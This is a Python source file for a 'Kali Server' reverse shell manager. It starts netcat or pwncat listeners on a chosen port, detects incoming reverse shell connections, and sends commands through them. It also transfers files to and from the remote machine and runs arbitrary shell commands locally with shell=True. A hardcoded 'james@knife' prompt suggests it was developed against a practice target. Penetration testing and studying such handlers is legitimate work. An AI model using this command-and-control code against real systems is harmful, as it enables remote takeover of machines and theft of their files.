#!/usr/bin/env python3
"""Reverse Shell Manager for Kali Server."""

import os
import time
import subprocess
import pty
import select
import signal
import threading
import queue
import uuid
import base64
from typing import Dict, Any
from .config import logger, COMMAND_TIMEOUT


class ReverseShellManager:
    """Class to manage reverse shell sessions with interactive capabilities"""
    
    def __init__(self, port: int, session_id: str, listener_type: str = "pwncat"):
        self.port = port
        self.session_id = session_id
        self.listener_type = listener_type  # 'netcat' or 'pwncat'
        self.process = None
        self.master_fd = None
        self.slave_fd = None
        self.is_connected = False
        self.last_output = ""
        self.listener_thread = None
        self.output_buffer = []
        self.max_buffer_size = 1000
        
    def start_listener(self) -> Dict[str, Any]:
        """Start a reverse shell listener using specified listener_type ('netcat' or 'pwncat')"""
        try:
            logger.info(f"Starting reverse shell listener '{self.listener_type}' on port {self.port}")
            if self.listener_type == 'pwncat':
                # Use pwncat for interactive PTY by default
                command = f"pwncat -l {self.port}"
                # Spawn pwncat listener with pipes
                self.process = subprocess.Popen(
                    command,
                    shell=True,
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=False
                )
                # No manual PTY allocation, use pipes
                self.master_fd = None
            else:
                # Default to netcat with PTY allocation
                command = f"nc -nvlp {self.port}"
                # Allocate pseudo-terminal
                master_fd, slave_fd = pty.openpty()
                self.master_fd = master_fd
                self.slave_fd = slave_fd
                # Spawn netcat listener attached to the slave side of PTY
                self.process = subprocess.Popen(
                    command,
                    shell=True,
                    stdin=slave_fd,
                    stdout=slave_fd,
                    stderr=slave_fd,
                    preexec_fn=os.setsid  # Create new process group
                )
                # Close slave FD in parent, communicate via master_fd
                os.close(slave_fd)
                # For netcat listeners on localhost, assume immediate readiness
                self.is_connected = True
            # Start monitoring thread
            self.listener_thread = threading.Thread(target=self._monitor_connection)
            self.listener_thread.daemon = True
            self.listener_thread.start()
            return {
                "success": True,
                "message": f"Reverse shell listener started using {self.listener_type} on port {self.port}",
                "session_id": self.session_id,
                "listener_command": command
            }
        except Exception as e:
            logger.error(f"Error starting reverse shell listener: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    def _monitor_connection(self):
        """Monitor the pwncat/netcat reverse shell connection"""
        timeout_count = 0
        max_timeout = 30  # Reduced to 30 seconds timeout
        
        if self.listener_type == 'pwncat':
            # For pwncat, wait for actual connection using netstat
            logger.info(f"Waiting for pwncat connection on port {self.port}")
            while timeout_count < max_timeout and self.process and self.process.poll() is None:
                try:
                    # Check for incoming connections on the port
                    netstat_result = subprocess.run(
                        f"netstat -an | grep :{self.port} | grep ESTABLISHED",
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=2
                    )
                    
                    if netstat_result.stdout.strip():
                        self.is_connected = True
                        logger.info(f"Pwncat reverse shell connection established on port {self.port}")
                        return
                    
                    time.sleep(1)
                    timeout_count += 1
                    
                except Exception as e:
                    logger.error(f"Error monitoring pwncat connection: {str(e)}")
                    break
            
            # If we reach here, no connection was established
            logger.warning(f"No pwncat connection established within {max_timeout} seconds")
            return
        
        while timeout_count < max_timeout and self.process and self.process.poll() is None:
            try:
                # Check for incoming connections on the port
                netstat_result = subprocess.run(
                    f"netstat -an | grep :{self.port} | grep ESTABLISHED",
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=2
                )
                
                if netstat_result.stdout.strip():
                    self.is_connected = True
                    logger.info(f"Netcat reverse shell connection established on port {self.port}")
                    break
                
                # Also check if netcat shows "connected" in stderr
                if self.process.stderr and self.process.stderr.readable():
                    try:
                        ready, _, _ = select.select([self.process.stderr], [], [], 1)
                        if ready:
                            output = self.process.stderr.readline()
                            if output and ("connect" in output.lower() or "from" in output.lower()):
                                self.is_connected = True
                                logger.info(f"Netcat reverse shell connection detected: {output.strip()}")
                                break
                    except:
                        pass
                
                time.sleep(1)
                timeout_count += 1
                
            except Exception as e:
                logger.error(f"Error monitoring netcat connection: {str(e)}")
                break
    
    def _drain_shell_buffer(self):
        """Drain any residual output from the shell buffer to prevent contamination"""
        if not (self.process and self.process.stdout):
            return
            
        try:
            # Quick drain of any pending output
            drain_count = 0
            while drain_count < 20:  # Limit to prevent infinite loop
                ready, _, _ = select.select([self.process.stdout], [], [], 0.05)
                if not ready:
                    break
                try:
                    line = self.process.stdout.readline()
                    if isinstance(line, bytes):
                        line = line.decode('utf-8', errors='ignore')
                    if not line:
                        break
                    logger.debug(f"Drained residual line: {line.strip()}")
                    drain_count += 1
                except:
                    break
        except Exception as e:
            logger.debug(f"Buffer drain failed (non-critical): {e}")

    def send_command(self, command: str, timeout: int = 60) -> Dict[str, Any]:
        """Send a command to the reverse shell with simple marker approach"""
        if not self.is_connected:
            return {
                "success": False,
                "error": "No active reverse shell connection",
                "output": ""
            }
        
        try:
            # For pwncat, always use STDIN/STDOUT approach (no PTY)
            if self.listener_type == 'pwncat':
                use_pty = False
            else:
                # For netcat listeners (PTY allocated), always use PTY I/O for commands
                use_pty = self.master_fd is not None and self.is_connected
                
            if use_pty:
                logger.info(f"Executing command via PTY: {command}")
                # Generate end marker
                marker_id = str(uuid.uuid4())[:8]
                end_marker = f"END_{marker_id}"
                # Send command and marker
                os.write(self.master_fd, (command + "\n").encode())
                time.sleep(0.1)
                os.write(self.master_fd, (f"echo '{end_marker}'\n").encode())
                # Collect output
                start_time = time.time()
                output_lines = []
                buffer = b""
                while time.time() - start_time < timeout:
                    rlist, _, _ = select.select([self.master_fd], [], [], 1.0)
                    if self.master_fd in rlist:
                        data = os.read(self.master_fd, 1024)
                        if not data:
                            break
                        buffer += data
                        # Split lines
                        parts = buffer.split(b"\n")
                        for line in parts[:-1]:
                            text = line.decode(errors='ignore').strip()
                            # End marker?
                            if end_marker in text:
                                output = '\n'.join(output_lines)
                                return {
                                    "success": True,
                                    "output": output,
                                    "command": command,
                                    "session_id": self.session_id,
                                    "lines_captured": len(output_lines),
                                    "execution_time": time.time() - start_time,
                                    "debug_info": {"end_marker": end_marker}
                                }
                            # Skip noise and echo lines
                            if self._is_shell_noise(text) or text.startswith("echo '"):
                                continue
                            output_lines.append(text)
                        buffer = parts[-1]
                # Timeout reached
                output = '\n'.join(output_lines)
                return {
                    "success": True,
                    "output": output,
                    "command": command,
                    "session_id": self.session_id,
                    "lines_captured": len(output_lines),
                    "execution_time": time.time() - start_time,
                    "debug_info": {"end_marker": end_marker, "timeout": True}
                }
            # Fallback to existing STDIN/STDOUT approach (used by pwncat)
            if self.process and self.process.stdin:
                logger.info(f"Executing command via STDIN/STDOUT: {command}")
                
                # Check if process is still alive
                if self.process.poll() is not None:
                    return {
                        "success": False,
                        "error": "Reverse shell process has terminated",
                        "output": ""
                    }
                
                # Clean any residual output from previous commands (skip for pwncat)
                if self.listener_type != 'pwncat':
                    self._drain_shell_buffer()
                
                # Use simple approach - just send the command with a unique end marker
                marker_id = str(uuid.uuid4())[:8]
                end_marker = f"END_{marker_id}"
                
                try:
                    # Send command followed by the end marker on separate lines
                    self.process.stdin.write(f"{command}\n".encode())
                    self.process.stdin.flush()
                    time.sleep(0.2)  # Small delay between command and marker
                    self.process.stdin.write(f"echo '{end_marker}'\n".encode())
                    self.process.stdin.flush()
                except BrokenPipeError:
                    return {
                        "success": False,
                        "error": "Broken pipe - reverse shell disconnected",
                        "output": ""
                    }
                
                logger.info(f"Command sent with end marker: {end_marker}")
                
                # Collect output until we see the end marker
                output_lines = []
                all_lines = []
                start_time = time.time()
                max_wait_time = timeout
                command_echo_skipped = False
                
                while time.time() - start_time < max_wait_time:
                    try:
                        def read_line_with_timeout(q):
                            try:
                                line = self.process.stdout.readline()
                                if isinstance(line, bytes):
                                    line = line.decode('utf-8', errors='ignore')
                                q.put(line)
                            except:
                                q.put(None)
                        
                        q = queue.Queue()
                        thread = threading.Thread(target=read_line_with_timeout, args=(q,))
                        thread.daemon = True
                        thread.start()
                        thread.join(timeout=3.0)  # 3 seconds per line
                        
                        try:
                            line = q.get_nowait()
                            if line:
                                clean_line = line.strip()
                                all_lines.append(clean_line)
                                
                                # Check for end marker
                                if end_marker in clean_line:
                                    logger.info(f"Found end marker: {end_marker}")
                                    break
                                
                                # Skip shell noise and command echoes
                                if self._is_shell_noise(clean_line):
                                    continue
                                
                                # Skip ANY end marker from any command (not just current one)
                                if clean_line.startswith('END_') and len(clean_line) == 12:
                                    logger.info(f"Skipping end marker from previous command: {clean_line}")
                                    continue
                                
                                # Skip the first occurrence of the command echo
                                if clean_line == command and not command_echo_skipped:
                                    command_echo_skipped = True
                                    continue
                                
                                # Skip echo command for the marker
                                if f"echo '{end_marker}'" in clean_line:
                                    continue
                                
                                # This is actual output
                                output_lines.append(clean_line)
                                logger.info(f"Captured output: '{clean_line}'")
                            
                            elif line is None:  # End of stream
                                break
                                
                        except queue.Empty:
                            # No output available, continue waiting
                            time.sleep(0.2)
                        
                    except Exception as e:
                        logger.error(f"Error reading output: {e}")
                        break
                
                # Process the captured output
                if output_lines:
                    result = '\n'.join(output_lines)
                else:
                    # Fallback: try to extract meaningful output from all lines
                    filtered_lines = []
                    for line in all_lines:
                        if (not self._is_shell_noise(line) and 
                            line != command and 
                            end_marker not in line and 
                            not (line.startswith('END_') and len(line) == 12) and  # Skip ANY end marker
                            f"echo '{end_marker}'" not in line and
                            not line.startswith('james@knife:')):
                            filtered_lines.append(line)
                    
                    result = '\n'.join(filtered_lines) if filtered_lines else f"Command '{command}' executed (no output captured)"
                
                logger.info(f"Command completed, captured {len(output_lines)} output lines")
                
                return {
                    "success": True,
                    "output": result,
                    "command": command,
                    "session_id": self.session_id,
                    "lines_captured": len(output_lines),
                    "execution_time": time.time() - start_time,
                    "debug_info": {
                        "end_marker": end_marker,
                        "total_lines": len(all_lines)
                    }
                }
                
            else:
                return {
                    "success": False,
                    "error": "No active netcat process",
                    "output": ""
                }
            
        except Exception as e:
            logger.error(f"Error executing command: {e}")
            return {
                "success": False,
                "error": str(e),
                "output": ""
            }
    
    def _is_shell_noise(self, line):
        """Check if a line is shell noise that should be filtered out"""
        if not line.strip():
            return True
            
        noise_patterns = [
            "bash: cannot set terminal process group",
            "Inappropriate ioctl for device", 
            "bash: no job control in this shell",
            "james@knife:",
            "$"
        ]
        
        for pattern in noise_patterns:
            if pattern in line:
                return True
                
        return False
    
    def get_status(self) -> Dict[str, Any]:
        """Get the status of the reverse shell session"""
        return {
            "session_id": self.session_id,
            "port": self.port,
            "is_connected": self.is_connected,
            "process_alive": self.process and self.process.poll() is None,
            "listener_active": self.listener_thread and self.listener_thread.is_alive()
        }
    
    def stop(self):
        """Stop the reverse shell listener"""
        try:
            if self.process:
                logger.info(f"Stopping reverse shell listener process (PID: {self.process.pid})")
                
                # Try different stopping approaches based on platform and process state
                try:
                    # First try gentle termination
                    self.process.terminate()
                    
                    # Wait a bit for graceful shutdown
                    try:
                        self.process.wait(timeout=3)
                        logger.info("Process terminated gracefully")
                    except subprocess.TimeoutExpired:
                        # If it doesn't terminate gracefully, force kill
                        logger.warning("Process didn't terminate gracefully, forcing kill")
                        self.process.kill()
                        self.process.wait(timeout=2)
                        
                except (ProcessLookupError, OSError) as e:
                    # Process might already be dead
                    logger.info(f"Process already terminated: {e}")
                    
                except Exception as e:
                    logger.error(f"Error during process termination: {e}")
                    # Last resort - try to kill by PID directly
                    try:
                        os.kill(self.process.pid, signal.SIGTERM)
                        time.sleep(1)
                        os.kill(self.process.pid, signal.SIGKILL)
                    except:
                        pass
                
                self.process = None
                
        except Exception as e:
            logger.error(f"Error stopping reverse shell: {str(e)}")
        
        # Always reset connection state regardless of process cleanup success
        self.is_connected = False
        logger.info("Reverse shell session stopped")
    
    def upload_content(self, content: str, remote_file: str, encoding: str = "base64") -> Dict[str, Any]:
        """Upload content with checksum verification using FileTransferManager."""
        try:
            from utils.transfer_manager import transfer_manager
            return transfer_manager.upload_via_reverse_shell_with_verification(
                shell_manager=self,
                content=content,
                remote_file=remote_file,
                encoding=encoding
            )
        except Exception as e:
            logger.error(f"Error in reverse shell upload: {str(e)}")
            return {"error": str(e), "success": False}

    def download_content(self, remote_file: str, encoding: str = "base64") -> Dict[str, Any]:
        """Download content with checksum verification using FileTransferManager."""
        try:
            from utils.transfer_manager import transfer_manager
            return transfer_manager.download_via_reverse_shell_with_verification(
                shell_manager=self,
                remote_file=remote_file,
                encoding=encoding
            )
        except Exception as e:
            logger.error(f"Error in reverse shell download: {str(e)}")
            return {"error": str(e), "success": False}


class CommandExecutor:
    """Class to handle command execution with better timeout management"""
    
    def __init__(self, command: str, timeout: int = COMMAND_TIMEOUT):
        self.command = command
        self.timeout = timeout
        self.process = None
        self.stdout_data = ""
        self.stderr_data = ""
        self.stdout_thread = None
        self.stderr_thread = None
        self.return_code = None
        self.timed_out = False
    
    def _read_stdout(self):
        """Thread function to continuously read stdout"""
        for line in iter(self.process.stdout.readline, ''):
            self.stdout_data += line
    
    def _read_stderr(self):
        """Thread function to continuously read stderr"""
        for line in iter(self.process.stderr.readline, ''):
            self.stderr_data += line
    
    def execute(self) -> Dict[str, Any]:
        """Execute the command and handle timeout gracefully"""
        logger.info(f"Executing command: {self.command}")
        
        try:
            self.process = subprocess.Popen(
                self.command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1  # Line buffered
            )
            
            # Start threads to read output continuously
            self.stdout_thread = threading.Thread(target=self._read_stdout)
            self.stderr_thread = threading.Thread(target=self._read_stderr)
            self.stdout_thread.daemon = True
            self.stderr_thread.daemon = True
            self.stdout_thread.start()
            self.stderr_thread.start()
            
            # Wait for the process to complete or timeout
            try:
                self.return_code = self.process.wait(timeout=self.timeout)
                # Process completed, join the threads
                self.stdout_thread.join()
                self.stderr_thread.join()
            except subprocess.TimeoutExpired:
                # Process timed out but we might have partial results
                self.timed_out = True
                logger.warning(f"Command timed out after {self.timeout} seconds. Terminating process.")
                
                # Try to terminate gracefully first
                self.process.terminate()
                try:
                    self.process.wait(timeout=5)  # Give it 5 seconds to terminate
                except subprocess.TimeoutExpired:
                    # Force kill if it doesn't terminate
                    logger.warning("Process not responding to termination. Killing.")
                    self.process.kill()
                
                # Update final output
                self.return_code = -1
            
            # Always consider it a success if we have output, even with timeout
            success = True if self.timed_out and (self.stdout_data or self.stderr_data) else (self.return_code == 0)
            
            return {
                "stdout": self.stdout_data,
                "stderr": self.stderr_data,
                "return_code": self.return_code,
                "success": success,
                "timed_out": self.timed_out,
                "partial_results": self.timed_out and (self.stdout_data or self.stderr_data)
            }
        
        except Exception as e:
            logger.error(f"Error executing command: {str(e)}")
            return {
                "stdout": self.stdout_data,
                "stderr": f"Error executing command: {str(e)}\n{self.stderr_data}",
                "return_code": -1,
                "success": False,
                "timed_out": False,
                "partial_results": bool(self.stdout_data or self.stderr_data)
            }


def execute_command(command: str) -> Dict[str, Any]:
    """
    Execute a shell command and return the result
    
    Args:
        command: The command to execute
        
    Returns:
        A dictionary containing the stdout, stderr, and return code
    """
    executor = CommandExecutor(command)
    return executor.execute()
